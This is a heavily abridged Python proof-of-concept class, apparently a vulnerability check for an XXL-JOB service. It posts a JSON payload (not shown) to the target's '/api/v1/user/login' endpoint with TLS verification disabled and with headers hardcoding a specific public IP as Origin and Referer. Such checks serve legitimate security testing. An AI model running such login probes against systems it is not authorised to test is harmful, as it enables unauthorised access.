...
class XXLJOBPOC(POCBase):
    ...
    def _check(self):
        ...
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                   ...
                   "Origin": "http://47.95.150.62:8089", "Connection": "close", "Referer": "http://47.95.150.62:8089/"
                   }
        ...
        try:
            url = self.url.strip() + "/api/v1/user/login"
            res = requests.post(url=url, headers=headers, json=payload, verify=False, timeout=9)
            data_dict = res.json()
            # 判断是否存在漏洞
